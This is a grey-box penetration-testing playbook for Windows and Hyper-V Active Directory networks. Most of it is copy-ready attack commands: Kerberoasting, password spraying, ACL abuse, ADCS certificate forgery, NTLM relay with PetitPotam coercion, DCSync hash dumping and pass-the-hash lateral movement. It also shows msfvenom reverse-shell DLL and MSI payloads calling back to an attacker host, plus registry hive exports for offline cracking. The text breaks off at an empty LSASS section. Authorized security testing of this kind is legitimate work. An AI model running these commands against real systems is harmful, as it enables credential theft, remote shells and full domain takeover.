# Hyper-V / Windows Infrastructure VAPT Playbook — Grey Box

> **Legal Notice:** This playbook is for use only when written authorization has been obtained from the asset owner. Unauthorized use is illegal. All testing must stay within the defined scope and rules of engagement.

## What is Grey Box Testing?
Grey box testing means you have **partial knowledge** of the target environment. Typically this means:
- A **low-privileged domain user account** (standard employee-level credentials)
- Knowledge of the **domain name** and possibly some network topology
- **Network access** (either on-site, via VPN, or on a test VLAN)
- No administrative privileges at the start

The goal is to simulate a **compromised internal user, a malicious insider, or a phishing victim** — and find out how far an attacker can go from there.

---

## Scope
Windows Server / Hyper-V environments where low-privileged domain credentials and internal network access have been provided.

## Objective
Starting from a low-privileged domain account, identify: weak configurations, excessive permissions, exploitable vulnerabilities, credential exposure, privilege escalation paths, and lateral movement opportunities — all the way to Domain Admin if possible.

---

## Tools Required

**Enumeration**
- nmap, crackmapexec / netexec (nxc), enum4linux-ng
- BloodHound + SharpHound (or BloodHound.py for remote)
- ldapdomaindump, ldapsearch
- impacket suite: GetUserSPNs.py, GetNPUsers.py, secretsdump.py, smbexec.py, psexec.py, lookupsid.py, rpcdump.py, ntlmrelayx.py
- kerbrute, Certipy, bloodyAD
- PowerView.ps1 (if shell access obtained)

**Exploitation / Post-Exploitation**
- Responder, mitm6
- Metasploit Framework
- evil-winrm, CrackMapExec / NetExec

**Scanning / Web**
- testssl.sh, nikto, gobuster, ffuf, eyewitness
- Nessus / OpenVAS (credentialed scan)

**Offline**
- hashcat, john the ripper

---

# Phase 1 — Network Enumeration (Internal Perspective)

## 1.1 Host Discovery from Inside

```bash
# ICMP + ARP sweep (much more reliable than black box)
nmap -sn <CIDR> --send-ip
nmap -sn -PR <CIDR>              # ARP — best for same subnet

# If ICMP is blocked, probe common Windows ports
nmap -sn -PS445,3389,135,80,88 <CIDR>
```

**What to do with results:**
- List all live hosts → start service scanning each one
- Any host not in the provided asset list → note as **undocumented asset** (finding: shadow IT / poor asset inventory)

---

## 1.2 OS Fingerprinting

```bash
nmap -O --osscan-guess <IP>
nmap -A -T3 <IP>
```

**Vulnerable Signs**
- EOL OS: Windows Server 2003, 2008, 2008 R2, Windows 7 → Critical finding
- Mixed patch levels across hosts with the same role

---

## 1.3 Full TCP + Targeted UDP Port Scan

```bash
# Full TCP
nmap -Pn -p- -sS -T3 --min-rate 1500 -oN tcp_full.txt <IP>

# Targeted UDP
nmap -sU -p53,67,69,123,137,138,161,162,389,500,4500 <IP>
```

**Key Ports for Grey Box**

| Port | Service | Priority |
|------|---------|---------|
| 88 | Kerberos | Critical — confirms DC |
| 135 | MSRPC | High |
| 139/445 | SMB | Critical |
| 389/636 | LDAP/LDAPS | Critical |
| 3268/3269 | Global Catalog | High |
| 3389 | RDP | High |
| 5985/5986 | WinRM HTTP/HTTPS | High |
| 1433 | MSSQL | High |
| 2179/6600 | Hyper-V | Medium |
| 161 (UDP) | SNMP | High |
| 53 | DNS | Medium |

---

## 1.4 Service & Version Detection

```bash
nmap -sV -sC -p <OPEN_PORTS> <IP> -oN service_full.txt
```

**Vulnerable Signs**
- EOL software versions in banners
- Unpatched component versions — cross-reference with CVE databases (cvedetails.com, nvd.nist.gov)

---

# Phase 2 — Credential Validation

## 2.1 Validate Provided Credentials Across All Hosts

```bash
# Test provided credentials on every live host at once
crackmapexec smb <CIDR> -u <USERNAME> -p <PASSWORD>
# or with netexec (nxc):
nxc smb <CIDR> -u <USERNAME> -p <PASSWORD>
```

**Reading the output:**
- `[+]` = credentials valid on that host — note it
- `(Pwn3d!)` = your user has **local admin** on that host → critical escalation path
- `[-]` = credentials not valid or account locked

> ✅ If you see `(Pwn3d!)` on multiple hosts → jump to **Phase 13.2 — Local Admin Reuse**

---

## 2.2 Check Your Own User Rights

```bash
# On a Windows host you have access to:
net user <USERNAME> /domain
net group "Domain Admins" /domain
whoami /groups
whoami /priv
```

**What to look for:**
- Membership in sensitive groups: Backup Operators, Account Operators, DNS Admins, Print Operators
- Dangerous privileges: `SeImpersonatePrivilege`, `SeBackupPrivilege`, `SeDebugPrivilege` → all are escalation paths

---

# Phase 3 — Active Directory Enumeration

## 3.1 BloodHound Data Collection — Most Important Step

BloodHound maps the entire domain and draws the shortest path from your account to Domain Admin.

```bash
# Remote collection (no shell needed — just credentials)
bloodhound-python -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -dc <DC_IP> -c All --zip

# If you have a shell on a Windows host — upload and run:
SharpHound.exe -c All --zipfilename bloodhound_data.zip
```

**After collection:**
1. Start BloodHound: `sudo neo4j start && bloodhound`
2. Upload the ZIP file
3. Right-click your username → **Mark as Owned**
4. Run these built-in queries:

| Query | What it shows |
|-------|--------------|
| Find Shortest Path to Domain Admins | Attack path from your user |
| Find Principals with DCSync Rights | Who can dump all hashes |
| Find Computers with Unconstrained Delegation | Hosts that cache TGTs |
| Find AS-REP Roastable Users | Accounts with no pre-auth |
| Find Kerberoastable Users with High Value Targets | Crackable service accounts |
| Shortest Paths to Domain Admin from Owned Principals | Your personal attack chain |

**Vulnerable Signs**
- Any visible path from your account to Domain Admin
- Unconstrained delegation on non-DC hosts
- Accounts with dangerous ACL edges (GenericAll, WriteDACL, etc.)

---

## 3.2 LDAP Full Authenticated Dump

```bash
# Full AD dump — creates HTML reports you can open in browser
ldapdomaindump -u '<DOMAIN>\<USERNAME>' -p '<PASSWORD>' <DC_IP>

# Open the reports
firefox domain_users.html
firefox domain_groups.html
firefox domain_computers.html
```

**What to look for in the reports:**
- Accounts where `adminCount=1` → these were or are privileged accounts
- Accounts with **Password Never Expires** set
- Accounts not logged in for 90+ days but still enabled → stale account
- Service accounts in Domain Admins group unexpectedly

---

## 3.3 Key LDAP Queries

```bash
# All users with attributes
ldapsearch -x -H ldap://<DC_IP> -D "<DOMAIN>\<USERNAME>" -w <PASSWORD> \
  -b "DC=domain,DC=local" "(objectClass=user)" cn sAMAccountName description memberOf userAccountControl

# All computers (check OS versions)
ldapsearch -x -H ldap://<DC_IP> -D "<DOMAIN>\<USERNAME>" -w <PASSWORD> \
  -b "DC=domain,DC=local" "(objectClass=computer)" cn operatingSystem

# All groups and members
ldapsearch -x -H ldap://<DC_IP> -D "<DOMAIN>\<USERNAME>" -w <PASSWORD> \
  -b "DC=domain,DC=local" "(objectClass=group)" cn member
```

**Vulnerable Signs**
- Service accounts in `Domain Admins` group
- Computer accounts running EOL operating systems (Windows 7, Server 2008)

---

## 3.4 Password Policy — Always Check Before Spraying

```bash
crackmapexec smb <DC_IP> -u <USERNAME> -p <PASSWORD> --pass-pol

# LDAP query
ldapsearch -x -H ldap://<DC_IP> -D "<DOMAIN>\<USERNAME>" -w <PASSWORD> \
  -b "DC=domain,DC=local" "(objectClass=domainDNS)" \
  minPwdLength pwdHistoryLength lockoutThreshold lockoutDuration pwdProperties
```

**Interpreting results:**

| Setting | Vulnerable Value | Finding |
|---------|-----------------|---------|
| `minPwdLength` | < 12 | Weak password policy |
| `lockoutThreshold` | 0 | No lockout — spray freely |
| `lockoutDuration` | 0 | Manual unlock needed |
| `pwdProperties` | 0 | No complexity requirement |

> ✅ If `lockoutThreshold = 0` → password spray (Phase 6) is safe to run without risk of lockout
> ⚠️ If lockout is set → calculate spray window: `(threshold - 1)` attempts per round with 30+ min gaps between rounds

---

## 3.5 Fine-Grained Password Policies (PSO)

Some accounts may have different policies than the domain default.

```bash
crackmapexec smb <DC_IP> -u <USERNAME> -p <PASSWORD> -M pso

# LDAP
ldapsearch -x -H ldap://<DC_IP> -D "<DOMAIN>\<USERNAME>" -w <PASSWORD> \
  -b "CN=Password Settings Container,CN=System,DC=domain,DC=local" -s sub
```

**What to do:**
- Service accounts with weaker PSO = ideal spray targets if their lockout threshold is higher

---

## 3.6 AdminSDHolder & AdminCount Check

```bash
ldapsearch -x -H ldap://<DC_IP> -D "<DOMAIN>\<USERNAME>" -w <PASSWORD> \
  -b "DC=domain,DC=local" "(adminCount=1)" cn sAMAccountName memberOf
```

**What this means:**
- `adminCount=1` accounts are protected by AdminSDHolder — ACLs are overwritten every 60 mins
- Downgraded accounts that still have `adminCount=1` → may have lingering permissions

---

## 3.7 Passwords in User Description Fields — Very Common Finding

```bash
ldapsearch -x -H ldap://<DC_IP> -D "<DOMAIN>\<USERNAME>" -w <PASSWORD> \
  -b "DC=domain,DC=local" "(description=*)" cn sAMAccountName description | \
  grep -i "pass\|pwd\|cred\|temp\|welcome\|initial\|login"
```

**Vulnerable Signs**
- Any description like `Temp password: Welcome1!` or `Set on join: P@ssw0rd` → critical
- Very common on service accounts set up by sysadmins years ago

---

# Phase 4 — SMB Enumeration (Authenticated)

## 4.1 Share Enumeration

```bash
# List all shares and permissions
crackmapexec smb <IP> -u <USERNAME> -p <PASSWORD> --shares
smbmap -H <IP> -u <USERNAME> -p <PASSWORD>

# Spider share contents
crackmapexec smb <IP> -u <USERNAME> -p <PASSWORD> -M spider_plus --share <SHARENAME>
smbmap -H <IP> -u <USERNAME> -p <PASSWORD> -R <SHARENAME>
```

**What to look for:**
- `WRITE` access on any share → can place malicious files for coerce attacks
- IT / backup / scripts / software shares → often contain credentials
- Files: `.txt`, `.xml`, `.bat`, `.ps1`, `.conf`, `.cfg` → grep for passwords

---

## 4.2 SYSVOL / NETLOGON — GPP Passwords (MS14-025)

This is a critical and very common finding in older domains.

**Background:** Between 2008–2012, Group Policy Preferences allowed admins to set local admin passwords via GPO. Microsoft embedded the AES key in public documentation — these passwords are fully decryptable by any domain user.

```bash
# Automated check (recommended first)
crackmapexec smb <DC_IP> -u <USERNAME> -p <PASSWORD> -M gpp_password
crackmapexec smb <DC_IP> -u <USERNAME> -p <PASSWORD> -M gpp_autologin

# Manual — browse SYSVOL
smbclient //<DC_IP>/SYSVOL -U <DOMAIN>/<USERNAME>%<PASSWORD>
# Navigate to: <DOMAIN>/Policies/ → search for Groups.xml, Services.xml, ScheduledTasks.xml

# If cpassword found → decrypt it
gpp-decrypt <CPASSWORD_VALUE>
```

**If output shows a cpassword attribute → it is a finding regardless of whether it cracks**

**Vulnerable Signs**
- Any `cpassword=` attribute in XML files under SYSVOL → High/Critical
- Decrypted password still valid → Critical

---

## 4.3 SMB Relay Target Identification

```bash
# Generate list of hosts with SMB signing disabled
crackmapexec smb <CIDR> -u <USERNAME> -p <PASSWORD> --gen-relay-list relay_targets.txt
cat relay_targets.txt
```

**What this means:**
- Hosts in `relay_targets.txt` are valid relay targets → NTLM auth captured from anywhere can be relayed to these hosts
- If DC is in the list → Critical (relaying to DC = LDAP writes = new admin accounts)

> ✅ If `relay_targets.txt` is not empty → proceed with **Phase 10 — NTLM Relay Attacks**

---

## 4.4 Sensitive File Search in Shares

```bash
# Spider all shares and look for interesting files
crackmapexec smb <IP> -u <USERNAME> -p <PASSWORD> -M spider_plus
# Review the .json output

# Targeted keyword search manually
smbmap -H <IP> -u <USERNAME> -p <PASSWORD> -R --pattern "*.xml,*.txt,*.ini,*.bat,*.ps1,*.kdbx,*.conf"
```

**File types to prioritize:**
- `.kdbx` → KeePass database → attempt offline cracking
- `Unattend.xml`, `sysprep.xml` → often contain Base64-encoded admin passwords
- `web.config`, `appsettings.json` → database connection strings with credentials
- `.bat`, `.ps1` → scripts with hardcoded credentials

**If you find any credential file → test credentials immediately across all hosts**

---

# Phase 5 — Kerberos Attacks

## 5.1 Kerberoasting — Service Account Hash Extraction

**What it is:** Any domain user can request a service ticket (TGS) for any account registered with a Service Principal Name (SPN). These tickets are encrypted with the account's password — crackable offline.

```bash
# Step 1: List all Kerberoastable accounts
GetUserSPNs.py <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <DC_IP>

# If accounts returned → Step 2: Request and save their hashes
GetUserSPNs.py <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <DC_IP> -request -outputfile kerberoast_hashes.txt

# Step 3: Crack offline
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

**Vulnerable Signs**
- Any SPN-registered account returned → note as finding (even if not cracked)
- Cracked password → test for lateral movement and group membership immediately

**After cracking:**
```bash
# Test cracked credentials
crackmapexec smb <CIDR> -u <SVC_ACCOUNT> -p <CRACKED_PASSWORD> --continue-on-success

# Check group membership via BloodHound (right-click account → "Shortest Paths to Here")
```

---

## 5.2 AS-REP Roasting — Accounts Without Kerberos Pre-Auth

**What it is:** Accounts with "Do not require Kerberos preauthentication" can have their encrypted AS-REP captured without providing any password. These are crackable offline.

```bash
# Get user list from LDAP first (Phase 3.2)
# Then request AS-REP for each
GetNPUsers.py <DOMAIN>/ -usersfile domain_users.txt -no-pass -dc-ip <DC_IP> -request -format hashcat

# Single user test
GetNPUsers.py <DOMAIN>/<USERNAME> -no-pass -dc-ip <DC_IP>

# Crack
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

**Vulnerable Signs**
- Hash returned for any account → `Do not require Kerberos preauthentication` is enabled → finding regardless of crack success

---

## 5.3 Unconstrained Delegation

**What it is:** Hosts with unconstrained delegation store TGTs of every user who authenticates to them. Compromising such a host lets you steal tickets and impersonate any user.

```bash
# Find hosts with unconstrained delegation
ldapsearch -x -H ldap://<DC_IP> -D "<DOMAIN>\<USERNAME>" -w <PASSWORD> \
  -b "DC=domain,DC=local" "(userAccountControl:1.2.840.113556.1.4.803:=524288)" cn sAMAccountName

# Also visible in BloodHound → "Find Computers with Unconstrained Delegation"
```

**Vulnerable Signs**
- Any **non-DC** host with unconstrained delegation → Critical escalation path
- DCs having unconstrained delegation is expected (by design) — non-DCs should never have it

---

## 5.4 Constrained Delegation

```bash
# Find constrained delegation accounts
ldapsearch -x -H ldap://<DC_IP> -D "<DOMAIN>\<USERNAME>" -w <PASSWORD> \
  -b "DC=domain,DC=local" "(msDS-AllowedToDelegateTo=*)" cn sAMAccountName msDS-AllowedToDelegateTo
```

**What to check:**
- If the service allowed to delegate to is high-value (cifs/DC, ldap/DC) → if you control the delegating account → escalation path

---

## 5.5 Resource-Based Constrained Delegation (RBCD)

```bash
# Check machine account quota — default is 10
ldapsearch -x -H ldap://<DC_IP> -D "<DOMAIN>\<USERNAME>" -w <PASSWORD> \
  -b "DC=domain,DC=local" -s base "(objectclass=domain)" ms-DS-MachineAccountQuota
```

**Interpreting results:**
- `ms-DS-MachineAccountQuota = 10` (default) → any domain user can add up to 10 computer accounts → RBCD attack is possible if you also have `WriteProperty` on any computer object
- `ms-DS-MachineAccountQuota = 0` → RBCD via this path is blocked

**Check for writable computer objects via BloodHound:**
- Edges: `GenericAll`, `GenericWrite`, `WriteProperty` pointing to a Computer node

---

# Phase 6 — Password Attacks

## 6.1 Password Spray

> ⚠️ **Always confirm the lockout policy (Phase 3.4) before running.** Spraying a domain with lockout=3 will lock out hundreds of accounts.

```bash
# Safe spray — 1 password per user, stay below lockout threshold
kerbrute passwordspray --dc <DC_IP> -d <DOMAIN> domain_users.txt 'Password123!'

# Via SMB
crackmapexec smb <DC_IP> -u domain_users.txt -p 'Password123!' --continue-on-success

# Wait minimum 30 minutes between rounds
```

**Recommended spray password list:**
- `Password1!`, `Password123!`, `Welcome1!`, `Welcome@123`
- `<CompanyName>2024!`, `<CompanyName>123!`
- `Spring2024!`, `Summer2024!`, `Winter2025!`
- `Admin@123`, `P@ssw0rd`

**Vulnerable Signs:**
- Any `[+]` result → immediately test that credential across all hosts and services

---

## 6.2 Offline Hash Cracking

```bash
# NTLMv2 hashes (from Responder / relay)
hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# NTLM hashes (from secretsdump)
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt

# AS-REP hashes
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# Kerberoast hashes
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

# Always try rules if wordlist alone fails
hashcat -m <MODE> hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/dive.rule
```

---

# Phase 7 — ACL / Permission Abuse

## 7.1 Identify Exploitable ACLs

**BloodHound is the best way to see this visually.**

Look for these edges in BloodHound pointing from your user/group to any target:

| ACL Edge | What You Can Do |
|----------|----------------|
| `GenericAll` on User | Reset their password without knowing current |
| `GenericAll` on Group | Add yourself or anyone to that group |
| `GenericAll` on Computer | RBCD attack → impersonate any user to that host |
| `GenericWrite` | Modify most attributes (e.g., set SPN for Kerberoasting) |
| `WriteDACL` | Give yourself any right on the object |
| `WriteOwner` | Take ownership → then grant yourself GenericAll |
| `ForceChangePassword` | Change user's password |
| `AddMember` | Add accounts to the group |
| `DCSync rights` | Dump all domain password hashes |

**BloodHound queries to run:**
- "Find Shortest Paths to Domain Admins from Owned Principals"
- Mark your user as Owned → re-run query

---

## 7.2 GenericAll on a User — Password Reset

```bash
# Using bloodyAD
bloodyAD -u <YOUR_USER> -p <YOUR_PASSWORD> -d <DOMAIN> --host <DC_IP> \
  set password <TARGET_USER> 'NewPassword123!'

# Test new credentials
crackmapexec smb <CIDR> -u <TARGET_USER> -p 'NewPassword123!' --continue-on-success
```

---

## 7.3 GenericAll / AddMember on a Group — Add Yourself

```bash
# Add your account to the target group
net rpc group addmem "<GROUP_NAME>" <YOUR_USER> \
  -U <DOMAIN>/<YOUR_USER>%<PASSWORD> -S <DC_IP>

# Verify
net rpc group members "<GROUP_NAME>" -U <DOMAIN>/<YOUR_USER>%<PASSWORD> -S <DC_IP>
```

**After adding yourself to a privileged group:**
- Log out and back in (or get a new Kerberos ticket) for group membership to apply
- `klist purge && klist get krbtgt` to refresh Kerberos tickets

---

## 7.4 WriteDACL — Grant Yourself DCSync Rights

```bash
# If you have WriteDACL on the domain root object
# Using bloodyAD
bloodyAD -u <YOUR_USER> -p <PASSWORD> -d <DOMAIN> --host <DC_IP> \
  add dcsync <YOUR_USER>

# Then DCSync
secretsdump.py <DOMAIN>/<YOUR_USER>:<PASSWORD>@<DC_IP>
```

---

# Phase 8 — DNS Admin Abuse

## 8.1 Check DNS Admin Membership

```bash
# Check if your user or any interesting account is in DnsAdmins
crackmapexec smb <DC_IP> -u <USERNAME> -p <PASSWORD> --groups | grep -i dns

ldapsearch -x -H ldap://<DC_IP> -D "<DOMAIN>\<USERNAME>" -w <PASSWORD> \
  -b "DC=domain,DC=local" "(cn=DnsAdmins)" member
```

**Vulnerable Signs**
- Your test account or any low-privileged account is in `DnsAdmins` → Critical privilege escalation to SYSTEM on DC

---

## 8.2 DnsAdmins → SYSTEM on DC

```bash
# Step 1: Create malicious DLL (reverse shell)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f dll -o evil.dll

# Step 2: Host it on your SMB server
impacket-smbserver share . -smb2support

# Step 3: Set the DLL as DNS server plugin (requires DnsAdmins)
dnscmd <DC_HOSTNAME> /config /serverlevelplugindll \\<ATTACKER_IP>\share\evil.dll

# Step 4: Restart DNS service to trigger DLL load
sc \\<DC_HOSTNAME> stop dns
sc \\<DC_HOSTNAME> start dns
# Shell received as SYSTEM
```

---

# Phase 9 — ADCS (Active Directory Certificate Services)

## 9.1 Detect ADCS

```bash
# Check for CA web enrollment (HTTP-based)
curl -sk https://<IP>/certsrv/
curl -sk http://<IP>/certsrv/

# LDAP — find CA objects
ldapsearch -x -H ldap://<DC_IP> -D "<DOMAIN>\<USERNAME>" -w <PASSWORD> \
  -b "CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" \
  "(objectClass=certificationAuthority)" cn
```

---

## 9.2 Full ADCS Enumeration with Certipy

```bash
# Find all vulnerable templates (best starting point)
certipy find -u <USERNAME>@<DOMAIN> -p <PASSWORD> -dc-ip <DC_IP> -vulnerable -stdout
```

**Common ESC vulnerabilities and what they mean:**

| ESC | Name | Impact |
|-----|------|--------|
| ESC1 | SAN Specification Allowed | Forge certificate for ANY user including Domain Admin |
| ESC2 | Any Purpose EKU | General certificate abuse |
| ESC3 | Certificate Request Agent | Request certs as other users |
| ESC4 | Template ACL Misconfiguration | Modify template → enable ESC1 |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 on CA | Same as ESC1 |
| ESC7 | CA ACL Misconfiguration | Manage CA → escalate |
| ESC8 | HTTP NTLM Relay to ADCS | Relay DC auth → get DC cert → DCSync |

---

## 9.3 ESC1 — Exploit Vulnerable Certificate Template

```bash
# Step 1: Find vulnerable template name from certipy output

# Step 2: Request certificate as Domain Administrator
certipy req -u <USERNAME>@<DOMAIN> -p <PASSWORD> \
  -ca <CA_NAME> -template <VULNERABLE_TEMPLATE> \
  -upn administrator@<DOMAIN> -dc-ip <DC_IP>
# Produces: administrator.pfx

# Step 3: Authenticate with the certificate → get NTLM hash
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
# Output shows the NT hash of Administrator

# Step 4: Pass-the-Hash → full domain admin
crackmapexec smb <DC_IP> -u administrator -H <NT_HASH>
impacket-psexec administrator@<DC_IP> -hashes :<NT_HASH>
```

---

## 9.4 ESC8 — NTLM Relay to ADCS Web Enrollment

This is the most powerful coerce → relay chain in modern AD environments.

```bash
# Step 1: Start NTLM relay targeting ADCS HTTP enrollment
impacket-ntlmrelayx \
  -t http://<ADCS_IP>/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController

# Step 2: Coerce DC to authenticate to your machine
# Option A: PetitPotam (MS-EFSRPC — works unauthenticated on unpatched DCs)
python3 PetitPotam.py -u <USERNAME> -p <PASSWORD> <ATTACKER_IP> <DC_IP>

# Option B: PrinterBug (MS-RPRN — requires credentials)
python3 printerbug.py <DOMAIN>/<USERNAME>:<PASSWORD>@<DC_IP> <ATTACKER_IP>

# Step 3: Relay captures DC auth → ADCS issues DC certificate
# ntlmrelayx prints: "Got certificate for DC$ account"

# Step 4: Authenticate with the DC certificate → get DC machine account hash
certipy auth -pfx dc.pfx -dc-ip <DC_IP>

# Step 5: DCSync using DC machine account hash
secretsdump.py -hashes :<DC_NTLM_HASH> '<DOMAIN>/DC$'@<DC_IP>
# → krbtgt hash → full domain compromise
```

---

# Phase 10 — NTLM Relay Attacks

## 10.1 Classic NTLM Relay (Responder + ntlmrelayx)

```bash
# Step 1: Edit Responder config — disable SMB and HTTP (ntlmrelayx handles these)
nano /etc/responder/Responder.conf
# Set: SMB = Off, HTTP = Off

# Step 2: Start Responder in poisoning mode
responder -I eth0 -rdwv

# Step 3: Start ntlmrelayx with relay target list
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -l loot/
# For interactive shell add: -i
```

**What happens:**
1. A machine resolves a non-existent hostname via LLMNR/NBT-NS
2. Responder poisons the response → victim authenticates to you
3. ntlmrelayx relays the auth to a target in `relay_targets.txt`
4. If relay succeeds → you get SMB access, command output, or an interactive shell

**Vulnerable Signs:**
- Any NTLM auth relayed successfully → finding regardless of what the auth achieves

---

## 10.2 IPv6 NTLM Relay (mitm6)

This works even when LLMNR/NBT-NS is disabled. IPv6 is enabled by default on all modern Windows.

```bash
# Terminal 1: mitm6 — advertises itself as IPv6 DNS for the domain
mitm6 -d <DOMAIN>

# Terminal 2: ntlmrelayx — relay to DC LDAP to create a new admin account
impacket-ntlmrelayx -6 -t ldaps://<DC_IP> -wh fakewpad.<DOMAIN> \
  -l loot/ --delegate-access

# When a machine reboots or a user logs in → their credentials get relayed
# ntlmrelayx will print new admin credentials or RBCD delegation setup
```

**Vulnerable Signs:**
- Any credential relayed → Critical
- New admin account created by relay → Critical

---

# Phase 11 — Coerce + Relay Full Attack Chain

The most powerful modern AD attack path. No existing vulnerability needed — just misconfiguration.

```
DC Auth Coerced → Relayed to ADCS → DC Certificate Issued → 
certipy auth → DC NTLM Hash → DCSync → krbtgt → Golden Ticket
```

```bash
# Step 1: Start ADCS relay (see Phase 9.4 — ESC8)
impacket-ntlmrelayx -t http://<ADCS_IP>/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController

# Step 2: Coerce DC
python3 PetitPotam.py -u <USERNAME> -p <PASSWORD> <ATTACKER_IP> <DC_IP>

# Step 3: Get DC certificate
# Step 4: Authenticate → DC hash
certipy auth -pfx dc.pfx -dc-ip <DC_IP>

# Step 5: DCSync → krbtgt + all account hashes
secretsdump.py -hashes :<DC_NTLM_HASH> '<DOMAIN>/DC$'@<DC_IP>
```

---

# Phase 12 — DCSync Attack

If you have DCSync rights (from ACL abuse, DnsAdmins escalation, ADCS chain, or direct grant):

```bash
# Dump all domain hashes
secretsdump.py <DOMAIN>/<USERNAME>:<PASSWORD>@<DC_IP>

# With hash (Pass-the-Hash)
secretsdump.py -hashes :<NTLM_HASH> <DOMAIN>/<USERNAME>@<DC_IP>

# Dump specific user only
secretsdump.py <DOMAIN>/<USERNAME>:<PASSWORD>@<DC_IP> -just-dc-user administrator

# Dump krbtgt for Golden Ticket
secretsdump.py <DOMAIN>/<USERNAME>:<PASSWORD>@<DC_IP> -just-dc-user krbtgt
```

**What to do after:**
- Test Administrator NTLM hash: `crackmapexec smb <CIDR> -u administrator -H <HASH>`
- krbtgt hash → document as **Golden Ticket creation possible** (persistence mechanism)

---

# Phase 13 — Lateral Movement

## 13.1 Pass-the-Hash (PTH)

No password needed — just the NTLM hash.

```bash
# Test hash on all hosts at once
crackmapexec smb <CIDR> -u <USERNAME> -H <NTLM_HASH> --continue-on-success

# Interactive shell options
impacket-wmiexec <DOMAIN>/<USERNAME>@<IP> -hashes :<NTLM_HASH>   # Quieter
impacket-smbexec <DOMAIN>/<USERNAME>@<IP> -hashes :<NTLM_HASH>   # Medium
impacket-psexec <DOMAIN>/<USERNAME>@<IP> -hashes :<NTLM_HASH>    # Noisy, creates service
```

**What to do on each compromised host:**
- Run `whoami /groups /priv`
- Dump local secrets → more hashes → more lateral movement
- Check for cached credentials → more accounts

---

## 13.2 Local Admin Password Reuse — Extremely Common Finding

One compromised local admin credential often works on many other hosts.

```bash
# Test using --local-auth flag (authenticates as local account, not domain account)
crackmapexec smb <CIDR> -u Administrator -H <LOCAL_ADMIN_NTLM_HASH> \
  --local-auth --continue-on-success

# Count how many (Pwn3d!) you get → that's your finding severity
```

**Vulnerable Signs:**
- 2+ hosts share the same local admin hash/password → High
- 10+ hosts → Critical
- All hosts → Critical (entire domain reachable from one compromise)

**Remediation note:** LAPS (Local Administrator Password Solution) prevents this.

---

## 13.3 Remote Execution Methods

```bash
# WinRM — cleanest, interactive shell
evil-winrm -i <IP> -u <USERNAME> -p <PASSWORD>
evil-winrm -i <IP> -u <USERNAME> -H <NTLM_HASH>

# WMI — less noisy, no files dropped on disk
impacket-wmiexec <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>

# SMBExec — moderate noise
impacket-smbexec <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>

# PSExec — very noisy, creates Windows service, flagged by most AV/EDR
impacket-psexec <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>

# DCOM — alternative lateral movement
impacket-dcomexec <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
```

**Detection risk (lowest to highest):** WMI → WinRM → SMBExec → PSExec

---

## 13.4 RDP Lateral Movement

```bash
# Normal credential-based RDP
xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:<IP> /cert-ignore

# Pass-the-Hash via RDP (requires Restricted Admin Mode enabled on target)
xfreerdp /u:<USERNAME> /pth:<NTLM_HASH> /v:<IP> /cert-ignore /restricted-admin
```

---

# Phase 14 — Post-Exploitation (Shell on Host)

> ⚠️ Only perform when you have authorized shell access to a host within scope.

## 14.1 Situational Awareness

First thing to run after getting a shell:

```bash
# Who am I and what rights do I have?
whoami /all

# What host am I on?
hostname
ipconfig /all
systeminfo

# Who else is logged in?
query session
net session

# What domain is this?
net config workstation

# What can I reach?
netstat -ano
arp -a
```

---

## 14.2 Local Privilege Escalation Checks

```bash
# Unquoted service paths (spaces in path without quotes → plant executable)
wmic service get name,displayname,pathname,startmode | \
  findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """"

# AlwaysInstallElevated — MSI runs as SYSTEM
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# If both = 1 → exploit: msfvenom -p windows/x64/shell_reverse_tcp -f msi -o evil.msi

# Scheduled tasks with weak permissions
schtasks /query /fo LIST /v | findstr /i "task name\|run as user\|task to run"

# Weak service permissions (accesschk needed on target)
accesschk.exe /accepteula -uwcqv * 2>nul | findstr /i "everyone\|authenticated users\|domain users"
```

---

## 14.3 Dangerous Token Privileges

```bash
whoami /priv
```

**If these appear — escalate immediately:**

| Privilege | Attack | Tool |
|-----------|--------|------|
| `SeImpersonatePrivilege` | Potato attack → SYSTEM | PrintSpoofer64.exe, GodPotato |
| `SeAssignPrimaryTokenPrivilege` | Potato attack → SYSTEM | PrintSpoofer64.exe |
| `SeBackupPrivilege` | Copy SAM/NTDS.dit → dump hashes | reg save commands |
| `SeDebugPrivilege` | Dump LSASS process → credentials | Mimikatz, procdump |
| `SeTakeOwnershipPrivilege` | Take ownership of any file | takeown.exe |

```bash
# If SeImpersonatePrivilege → SYSTEM shell
.\PrintSpoofer64.exe -i -c cmd
.\GodPotato-NET4.exe -cmd "cmd /c whoami"

# If SeBackupPrivilege → copy hashes offline
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
reg save HKLM\SECURITY security.save
# Transfer files to attacker machine, then:
secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
```

---

## 14.4 Credential Extraction from LSASS

```bash
